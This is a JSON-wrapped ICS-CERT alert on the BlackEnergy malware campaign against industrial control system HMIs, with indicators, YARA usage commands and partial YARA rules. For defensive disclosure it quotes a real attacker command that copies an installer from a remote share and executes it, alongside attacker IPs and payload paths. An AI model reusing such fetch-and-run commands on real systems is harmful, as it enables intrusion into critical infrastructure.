{
    "id": "7a8af5cd-a8b9-4e8e-9167-ac09a8d18a4f",
    "created_at": "2022-10-25T16:48:21.761504Z",
    "updated_at": "2025-03-27T02:17:05.512785Z",
    "deleted_at": null,
    "sha1_hash": "547c04be6d9ef7f6c4df1bc978b101526a9948e4",
    "title": "Ongoing Sophisticated Malware Campaign Compromising ICS (Update C) | ICS-CERT",
    "authors": "",
    "file_creation_date": "2016-01-29T10:22:44Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 164043,
    "plain_text": "**HOME** **ABOUT** **ICSJWG** **INFORMATION**\n\n**PRODUCTS**\n\n\n**TRAINING** **FAQ**\n\n\n**Control Systems**\n\n\n**Home**\n\n**Calendar**\n\n**ICSJWG**\n\n**Information Products**\n\n**Training**\n\n**Recommended Practices**\n\n**Assessments**\n\n**Standards & References**\n\n**Related Sites**\n\n**FAQ**\n\n\n# Alert (ICS-ALERT-14-281-01C) More Alerts\n## Ongoing Sophisticated Malware Campaign Compromising ICS (Update C)\n\n**Original release date: December 10, 2014 | Last revised: January 26, 2016**\n\n##### Legal Notice\n\n**[All information products included in http://ics-cert.us-cert.gov are provided \"as is\" for informational purposes only. The](http://ics-cert.us-cert.gov)**\n**Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information**\n**contained within. DHS does not endorse any commercial product or service, referenced in this product or otherwise.**\n**Further dissemination of this product is governed by the Traffic Light Protocol (TLP) marking in the header. For more**\n**[information about TLP, see http://www.us-cert.gov/tlp/.](http://www.us-cert.gov/tlp/)**\n\n#### SUMMARY\n\n**This alert update is a follow-up to the updated NCCIC/ICS-CERT Alert titled ICS-ALERT-14-281-01B Ongoing**\n**Sophisticated Malware Campaign Compromising ICS that was published December 10, 2014, on the ICS-CERT web site.**\n\n**ICS-CERT has identified a sophisticated malware campaign that has compromised numerous industrial control systems**\n**(ICSs) environments using a variant of the BlackEnergy malware. Analysis indicates that this campaign has been ongoing**\n**since at least 2011. Multiple companies working with ICS-CERT have identified the malware on Internet-connected**\n**human-machine interfaces (HMIs).**\n\n##### --------- Begin Update C Part 1 of 2 -------\n**Recent open-source reports have circulated alleging that a December 23, 2015, power outage in Ukraine was caused by**\n**BlackEnergy Malware. ICS-CERT and US-CERT are working with the Ukrainian CERT and our international partners to**\n**analyze the malware and can confirm that a BlackEnergy 3 variant was present in the system. Based on the technical**\n**artifacts ICS-CERT and US-CERT have been provided, we cannot confirm a causal link between the power outage with**\n**the presence of the malware. However, we continue to support CERT-UA on this issue. The YARA signature included with**\n**the original posting of this alert has been shown to identify a majority of the samples seen as of this update and continues**\n**to be the best method for detecting BlackEnergy infections.**\n\n**While there are many open source reports of BE3, this is the first opportunity ICS-CERT has been able to provide results**\n**of malware analysis. In a departure from the ICS product vulnerabilities used to deliver the BE2 malware, in this case the**\n**infection vector appears to have been spear phishing via a malicious Microsoft Office (MS Word) attachment. ICS-CERT**\n**and US-CERT analysis and support are ongoing, and additional technical analysis will be made available on the US-**\n**CERT Secure Portal.**\n\n##### --------- End Update C Part 1 of 2 -------\n**ICS-CERT originally published information and technical indicators about this campaign in a** **[TLP Amber](https://www.us-cert.gov/tlp/)** **alert (ICS-**\n**ALERT-14-281-01P) that was released to the US-CERT secure portal on October 8, 2014, and updated on Decembera**\n**[10, 2014. US critical infrastructure asset owners and operators can request access to this information by emailing ics-](mailto:ics-cert@hq.dhs.gov)**\n**cert@hq.dhs.gov** **.**\n\n#### DETAILS\n\n**ICS-CERT has determined that users of HMI products from various vendors have been targeted in this campaign,**\n**including GE Cimplicity, Advantech/Broadwin WebAccess, and Siemens WinCC. It is currently unknown whether other**\n**vendor’s products have also been targeted. ICS-CERT is working with the involved vendors to evaluate this activity and**\n**also notify their users of the linkages to this campaign.**\n\n**At this time, ICS-CERT has not identified any attempts to damage, modify, or otherwise disrupt the victim systems’ control**\n**processes. ICS-CERT has not been able to verify if the intruders expanded access beyond the compromised HMI into the**\n**remainder of the underlying control system. However, typical malware deployments have included modules that search**\n**out any network-connected file shares and removable media for additional lateral movement within the affected**\n**environment. The malware is highly modular and not all functionality is deployed to all victims.**\n\n**In addition, public reports  reference a BlackEnergy-based campaign against a variety of overseas targets leveragingb c**\n**vulnerability CVE-2014-4114 (affecting Microsoft Windows and Windows Server 2008 and 2012). ICS-CERT has notd**\n**observed the use of this vulnerability to target control system environments. However, analysis of the technical findings in**\n**the two report shows linkages in the shared command and control infrastructure between the campaigns, suggesting both**\n**are part of a broader campaign by the same threat actor.**\n\n**ICS-CERT strongly encourages asset owners and operators to look for signs of compromise within their control systems**\n**environments. Any positive or suspected findings should be immediately reported to ICS-CERT for further analysis and**\n**correlation**\n\n\n-----\n\n**direct connection to the Internet. Analysis of victim system artifacts has determined that the actors have been exploiting a**\n**[vulnerability in GE’s Cimplicity HMI product since at least January 2012. The vulnerability, CVE-2014-0751, was](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0751)**\n**[published in ICS-CERT advisory ICSA-14-023-01 on January 23, 2014. Guidance for remediation was published to the](https://ics-cert.us-cert.gov/advisories/ICSA-14-023-01)**\n**GE IP portal in December 2013. GE has also released a statement about this campaign on the GE security web site.e** **f**\n\n**Using this vulnerability, attackers were able to have the HMI server execute a malicious .cim file [Cimplicity screen file]**\n**hosted on an attacker-controlled server.**\n\n**Date            Request Type     Requestor IP     Screen Served**\n\n**1/17/2012 7:16      Start          <attackerIP>    //212.124.110.146/testshare/payload.cim**\n\n**9/9/2013 1:49       Start          <attackerIP>    //46.165.250.32/incoming/devlist.cim**\n\n**9/10/2014 3:59      Start          <attackerIP>   \\\\94.185.85.122\\public\\config.bak**\n\n**Figure 1. Log entries showing execution of remote .cim file.**\n\n**ICS-CERT has analyzed two different .cim files used in this campaign: devlist.cim and config.bak. Both files use scripts to**\n**ultimately install the BlackEnergy malware.**\n\n**devlist.cim: This file uses an embedded script that is executed as soon as the file is opened using the Screen Open**\n**event. The obfuscated script downloads the file “newsfeed.xml” from the same remote server, which it saves in the**\n**Cimplicity directory using the name <41 character string>.wsf. The name is randomly generated using upper and**\n**lower case letters, numbers, and hyphens. The .wsf script is then executed using the Windows command-based script**\n**host (cscript.exe). The new script downloads the file “category.xml,” which it saves in the Cimplicity directory using the**\n**name “CimWrapPNPS.exe.” CimWrapPNPS.exe is a BlackEnergy installer that deletes itself once the malware is**\n**installed.**\n\n**config.bak: This file uses a script that is executed when the file is opened using the OnOpenExecCommand event.**\n**The script downloads a BlackEnergy installer from a remote server, names it “CimCMSafegs.exe,” copies it into the**\n**Cimplicity directory, and then executes it. The CimCMSafegs.exe file is a BlackEnergy installer that deletes itself after**\n**the malware is installed.**\n\n**cmd.exe /c “copy \\\\94[dot]185[dot]85[dot]122\\public\\default.txt “%CIMPATH%\\CimCMSafegs.exe” && start**\n\n**“WOW64” “%CIMPATH”\\CimCMSafegs.exe”**\n\n**Figure 2. Script executed by malicious config.bak file.**\n\n**Analysis suggests that the actors likely used automated tools to discover and compromise vulnerable systems. ICS-CERT**\n**is concerned that any companies that have been running Cimplicity since 2012 with their HMI directly connected to the**\n**Internet could be infected with BlackEnergy malware. ICS-CERT strongly recommends that companies use the indicators**\n**and Yara signature in this alert to check their systems. In addition, we recommend that all Cimplicity users review ICS-**\n**[CERT advisory ICSA-14-023-01 and apply the recommended mitigations.](https://ics-cert.us-cert.gov/advisories/ICSA-14-023-01)**\n\n##### WINCC\n\n**While ICS-CERT lacks definitive information on how WinCC systems are being compromised by BlackEnergy, there are**\n**indications that one of the vulnerabilities fixed with the latest update for SIMATIC WinCC may have been exploited by the**\n**BlackEnergy malware. ICS-CERT strongly encourages users of WinCC, TIA Portal, and PCS7 to update their software tog**\n**[the most recent version as soon as possible. Please see Siemens Security Advisory SSA-134508](http://www.siemens.com/innovation/pool/de/forschungsfelder/siemens_security_advisory_ssa-134508.pdf)** **and and ICS-CERT**\n**[advisory ICSA-14-329-02D for additional details.](https://ics-cert.us-cert.gov/advisories/ICSA-14-329-02D)**\n\n##### ADVANTECH/BROADWIN WEBACCESS\n\n**A number of the victims associated with this campaign were running the Advantech/BroadWin WebAccess software with**\n**a direct Internet connection. We have not yet identified the initial infection vector for victims running this platform but**\n**believe it is being targeted.**\n\n#### DETECTION\n\n##### YARA SIGNATURE\n\n --------- Begin Update C Part 2 of 2 -------\n**ICS-CERT has published instruction for how to use the YARA signature for typical information technology environments.**\n**ICS-CERT recommends a phased approach to utilize this YARA signature in an industrial control systems (ICSs)**\n**environment. Test the use of the signature in the test/quality assurance/development ICS environment if one exists. If not,**\n**deploy the signature against backup or alternate systems in the top end of the ICS environment; this signature will not be**\n**usable on the majority of field devices.**\n\n##### --------- End Update C Part 2 of 2 -------\n**ICS-CERT has produced a Yara signature to aid in identifying if the malware files are present on a given system. This**\n**signature is provided “as is” and has not been fully tested for all variations or environments. Any positive or suspected**\n**findings should be immediately reported to ICS-CERT for further analysis and correlation. The Yara signature is available**\n**at:**\n\n**/sites/default/files/file_attach/ICS-ALERT-14-281-01.yara**\n\n**YARA is a pattern-matching tool used to by computer security researchers and companies to help identify malware. You**\n**[can find usage help and download links on the main Yara page at http://plusvic.github.io/yara/](http://plusvic.github.io/yara/)** **. For use on a Windows**\n**machine, you can download the precompiled binaries at:**\n\n\n-----\n\n**Yara version 3.1.0 32-bit**\n\n**yara32.exe:**\n\n**MD5 - fddd3831d7026c81cbd189ac567421ab**\n\n**SHA256 - 865992534620d38b988df10a79a39bb12519f44aee8a56233a58cfb54a48c895**\n\n**yarac32.exe:**\n\n**MD5 - 87273afb970743c7eee001a3ec6a71cd**\n\n**SHA256 - 94ece384cded7e35ca8d600deeea7d59776098f4e459ddab5a94b1f470e59174**\n\n**Yara version 3.1.0 64-bit**\n\n**yara64.exe:**\n\n**MD5 - 105c05f8d789e85c36dd845b5fbb323e**\n\n**SHA256 - 77c657dacac4d737c3791d284ea8c750ff7fffe88d47397e049586a1980710be**\n\n**yarac64.exe:**\n\n**MD5 - c9b79b1a4cf4fb9a31391a1c15bed6d6**\n\n**SHA256 - 7bfcbafc1b814be1ec337fd653289c073913140325685119445afa471e65eb94**\n\n**Once downloaded, extract the zip archive to the computer where you need to run the signatures and copy the ICS-CERT**\n**Yara rule into the same folder. For a comprehensive search (which will take a number of hours, depending on the**\n**system), use the following command:**\n\n**yara32.exe -r -s ICS-ALERT-14-281-01.yara C: >> yara_results.txt**\n\n**For a quicker search, use the following:**\n\n**(for Windows Vista and later)**\n\n**yara32.exe -r -s ICS-ALERT-14-281-01.yara C:\\Windows >> yara_results.txt**\n\n**yara32.exe -r -s ICS-ALERT-14-281-01.yara C:\\Users >> yara_results.txt**\n\n**(for Windows XP or earlier)**\n\n**yara32.exe -r -s ICS-ALERT-14-281-01.yara C:\\Windows >> yara_results.txt**\n\n**yara32.exe -r -s ICS-ALERT-14-281-01.yara \"C:\\Documents and Settings\" >> yara_results.txt**\n\n**These commands will create a text file named “Yara_results.txt” in the same folder as the rule and Yara executable. If the**\n**search returns hits, you can send this file to ICS-CERT, and ICS-CERT will verify if your system is compromised by**\n**BlackEnergy.**\n\n**//ICS-CERT BlackEnergy Yara rules from ICS-ALERT-14-281-01**\n\n**rule BlackEnergy2**\n\n**//ICS-CERT rule to BlackEnergy2 versions 5.0.0 through 7.1.2 (full) and versions 10.0.0 through 11.1.0 (light)**\n\n**//version 3**\n\n**{**\n\n**strings:**\n\n**$a1 = \"Adobe Flash Player Installer\" wide nocase**\n\n**$a3 = \"regedt32.exe\" wide nocase**\n\n**$a4 = \"WindowsSysUtility\" wide nocase**\n\n**$a6 = \"USB MDM Driver\" wide nocase**\n\n**$b1 = {00 05 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 3F 00 00 00**\n**00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5C 04 00 00 01 00 53 00 74 00 72 00 69 00**\n**6E 00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 1C 02 00 00 01 00 30 00 30 00 31 00 35 00 30 00**\n**34 00 62 00 30 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00**\n\n\n-----\n\n**2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67 00**\n**61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00**\n**68 00 74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 31 00 33 00 00 00 00 00 3E 00 0B 00 01 00 4F 00 72 00 69 00**\n**67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73 00 62 00 6D 00 64 00**\n**6D 00 2E 00 73 00 79 00 73 00 00 00 00 00 66 00 23 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00**\n**6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 57 00 69 00 6E 00 64 00 6F 00**\n**77 00 73 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65 00 6D 00**\n**00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00**\n**00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 1C 02 00 00 01 00 30 00**\n**34 00 30 00 39 00 30 00 34 00 62 00 30 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00**\n**61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00**\n**6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 46 00 0F 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00**\n**72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 55 00 53 00 42 00 20 00 4D 00 44 00 4D 00 20 00 44 00 72 00**\n**69 00 76 00 65 00 72 00 00 00 00 00 3C 00 0E 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00**\n**6E 00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 4A 00 13 00**\n**01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00**\n**79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 31 00 33 00 00 00 00 00 3E 00 0B 00 01**\n**00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73**\n**00 62 00 6D 00 64 00 6D 00 2E 00 73 00 79 00 73 00 00 00 00 00 66 00 23 00 01 00 50 00 72 00 6F 00 64 00 75 00 63**\n**00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 57 00 69**\n**00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73**\n**00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73**\n**00 69 00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 48**\n**00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 28 00 08 00 00 00 54**\n**00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 15 00 B0 04 09 04 B0 04}**\n\n**$b2 = {34 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 03 00 03 00 04 00 02 00 03 00 03 00 04 00 02 00 3F 00 00 00**\n**00 00 00 00 04 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 94 02 00 00 00 00 53 00 74 00 72 00 69 00 6E**\n**00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 70 02 00 00 00 00 30 00 34 00 30 00 39 00 30 00 34**\n**00 65 00 34 00 00 00 4A 00 15 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00**\n**00 53 00 6F 00 6C 00 69 00 64 00 20 00 53 00 74 00 61 00 74 00 65 00 20 00 4E 00 65 00 74 00 77 00 6F 00 72 00 6B**\n**00 73 00 00 00 00 00 62 00 1D 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69**\n**00 6F 00 6E 00 00 00 00 00 41 00 64 00 6F 00 62 00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00 6C 00 61**\n**00 79 00 65 00 72 00 20 00 49 00 6E 00 73 00 74 00 61 00 6C 00 6C 00 65 00 72 00 00 00 00 00 30 00 08 00 01 00 46**\n**00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 33 00 2E 00 33 00 2E 00 32 00 2E 00 34**\n**00 00 00 32 00 09 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 68 00 6F**\n**00 73 00 74 00 2E 00 65 00 78 00 65 00 00 00 00 00 76 00 29 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70**\n**00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00**\n**29 00 20 00 41 00 64 00 6F 00 62 00 65 00 20 00 53 00 79 00 73 00 74 00 65 00 6D 00 73 00 20 00 49 00 6E 00 63 00**\n**6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 65 00 64 00 00 00 00 00 3A 00 09 00 01 00 4F 00 72 00 69 00 67 00 69 00**\n**6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 68 00 6F 00 73 00 74 00 2E 00 65 00 78 00**\n**65 00 00 00 00 00 5A 00 1D 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00**\n**41 00 64 00 6F 00 62 00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00 6C 00 61 00 79 00 65 00 72 00 20 00**\n**49 00 6E 00 73 00 74 00 61 00 6C 00 6C 00 65 00 72 00 00 00 00 00 34 00 08 00 01 00 50 00 72 00 6F 00 64 00 75 00**\n**63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 33 00 2E 00 33 00 2E 00 32 00 2E 00 34 00 00 00 44 00**\n**00 00 00 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00**\n**72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04 46 45 32 58}**\n\n**$b3 = {C8 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00**\n**00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 02 00 00 01 00 53 00 74 00 72 00 69 00 6E**\n**00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 04 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34**\n**00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00**\n**00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69**\n**00 6F 00 6E 00 00 00 48 00 10 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69**\n**00 6F 00 6E 00 00 00 00 00 49 00 44 00 45 00 20 00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69 00 76 00 65 00 72**\n**00 00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E**\n**00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00 28 00 78 00 70 00 73 00 70 00 2E 00 30**\n**00 38 00 30 00 34 00 31 00 33 00 2D 00 30 00 38 00 35 00 32 00 29 00 00 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67**\n**00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67**\n**00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 30 00 39 00 00 00 00 00 66 00 23 00 01 00 50 00 72 00 6F 00**\n**64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00**\n**20 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20 00**\n**53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00**\n**65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00**\n**32 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00**\n**04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04}**\n\n**$b4 = {9C 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 01 00 06 00 01 40 B0 1D 01 00 06 00 01 40 B0 1D 3F 00 00 00**\n**00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FA 02 00 00 01 00 53 00 74 00 72 00 69 00 6E**\n**00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 D6 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34**\n**00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00**\n**00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69**\n**00 6F 00 6E 00 00 00 58 00 18 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69**\n**00 6F 00 6E 00 00 00 00 00 52 00 65 00 67 00 69 00 73 00 74 00 72 00 79 00 20 00 45 00 64 00 69 00 74 00 6F 00 72**\n**00 20 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 00 00 6C 00 26 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72**\n**00 73 00 69 00 6F 00 6E 00 00 00 00 00 36 00 2E 00 31 00 2E 00 37 00 36 00 30 00 30 00 2E 00 31 00 36 00 33 00 38**\n**00 35 00 20 00 28 00 77 00 69 00 6E 00 37 00 5F 00 72 00 74 00 6D 00 2E 00 30 00 39 00 30 00 37 00 31 00 33 00 2D**\n**00 31 00 32 00 35 00 35 00 29 00 00 00 3A 00 0D 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61**\n**00 6D 00 65 00 00 00 72 00 65 00 67 00 65 00 64 00 74 00 33 00 32 00 2E 00 65 00 78 00 65 00 00 00 00 00 80 00 2E**\n**00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9 00 20 00 4D**\n**00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F**\n\n\n-----\n\n**00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 AE 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 20 00 4F**\n**00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 42 00 0F**\n**00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 36 00 2E 00 31**\n**00 2E 00 37 00 36 00 30 00 30 00 2E 00 31 00 36 00 33 00 38 00 35 00 00 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00**\n**46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00**\n**61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 B0 04}**\n\n**$b5 = {78 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 00 00 05 00 6A 44 B1 1D 00 00 05 00 6A 44 B1 1D 3F 00 00 00**\n**00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D6 02 00 00 01 00 53 00 74 00 72 00 69 00**\n**6E 00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 B2 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00**\n**34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00**\n**00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00**\n**69 00 6F 00 6E 00 00 00 4E 00 13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00**\n**69 00 6F 00 6E 00 00 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 53 00 79 00 73 00 55 00 74 00 69 00**\n**6C 00 69 00 74 00 79 00 00 00 00 00 72 00 29 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00**\n**6E 00 00 00 00 00 35 00 2E 00 30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34 00 20 00 28 00**\n**77 00 69 00 6E 00 37 00 73 00 70 00 31 00 5F 00 72 00 74 00 6D 00 2E 00 31 00 30 00 31 00 31 00 31 00 39 00 2D 00**\n**31 00 38 00 35 00 30 00 29 00 00 00 00 00 30 00 08 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00**\n**61 00 6D 00 65 00 00 00 6D 00 73 00 69 00 65 00 78 00 65 00 63 00 00 00 80 00 2E 00 01 00 4C 00 65 00 67 00 61 00**\n**6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9 00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00**\n**6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20 00 41 00 6C 00**\n**6C 00 20 00 72 00 69 00 67 00 68 00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72 00 76 00 65 00 64 00 2E 00 00 00**\n**40 00 0C 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00**\n**00 00 6D 00 73 00 69 00 65 00 78 00 65 00 63 00 2E 00 65 00 78 00 65 00 00 00 58 00 1C 00 01 00 50 00 72 00 6F 00**\n**64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 57 00 69 00 6E 